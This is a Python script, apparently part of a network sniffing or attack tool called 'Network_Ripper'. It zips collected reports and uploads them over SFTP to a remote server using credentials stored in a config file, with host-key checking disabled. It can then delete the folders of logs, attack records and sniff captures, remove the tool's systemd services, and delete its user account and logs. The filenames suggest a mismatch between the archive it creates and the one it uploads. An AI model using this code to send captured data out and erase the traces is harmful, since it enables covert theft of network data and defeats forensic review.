#!/usr/bin/python

import os
import shutil
import subprocess
import sys
import paramiko
import configparser
import datetime


def get_formatted_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def get_uniq_filename():
    return datetime.datetime.now().strftime("%Y-%m-%d_%H.%M.%S")


def delete_user(username):
    try:
        subprocess.run(['sudo', 'userdel', '-r', username], check=True)
        print(f"[+] [{get_formatted_time()}] User {username} was successfully deleted.")

        logs_directory = f'/var/log/{username}'
        if os.path.exists(logs_directory):
            subprocess.run(['sudo', 'rm', '-rf', logs_directory], check=True)
            print(f"[+] [{get_formatted_time()}] Logs for user {username} have been successfully deleted.")
    except subprocess.CalledProcessError:
        print(f"[-] [{get_formatted_time()}] Error: Failed to delete user {username}.")
        sys.exit(1)


def delete_reports(folder_path):
    for item in os.listdir(folder_path):
        item_path = os.path.join(folder_path, item)
        if os.path.isfile(item_path):
            os.remove(item_path)
        elif os.path.isdir(item_path):
            shutil.rmtree(item_path)


def remove_systemd_service(service_name):
    try:
        os.system(f'sudo systemctl stop {service_name}')
        os.system(f'sudo systemctl disable {service_name}')
        service_file = f'/etc/systemd/system/{service_name}.service'
        os.system(f'sudo rm -f {service_file}')
        os.system('sudo systemctl daemon-reload')
        print(f"[+] [{get_formatted_time()}] Service {service_name} was successfully deleted.")
    except Exception as e:
        print(f"[-] [{get_formatted_time()}] Error: Failed to delete service {service_name}: {e}")


def main():
    try:
        config = configparser.ConfigParser()
        config.read('local_config.ini')

        report_folder = config.get('report_path', 'base_path')
        archive_path = "report.zip"

        shutil.make_archive(report_folder, 'zip', report_folder)

        ip, username, password = config.get('settings', 'report_ssh_server_creds').split(":")
        with paramiko.SSHClient() as ssh:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password)

            with ssh.open_sftp() as sftp:
                sftp.put(archive_path, "report_{}.zip".format(get_uniq_filename()))

        os.remove(archive_path)

        print(f"[+] [{get_formatted_time()}] Report sent successfully.\n")

        if config.getboolean('settings', 'clear_logs_after_sending_report'):
            delete_reports(config.get('report_path', 'log_path'))
            delete_reports(config.get('report_path', 'attacks_path'))
            delete_reports(config.get('report_path', 'network_information_path'))
            delete_reports(config.get('report_path', 'sniff_path'))

        if config.getboolean('settings', 'uninstall_network_ripper_after_sending_report'):
            remove_systemd_service("Network_Ripper")
            remove_systemd_service("Network_Ripper_Cron")
            delete_user("Ripper")

    except Exception as e:
        print(f"[-] [{get_formatted_time()}] Report sending error: {e}")


if __name__ == "__main__":
    main()
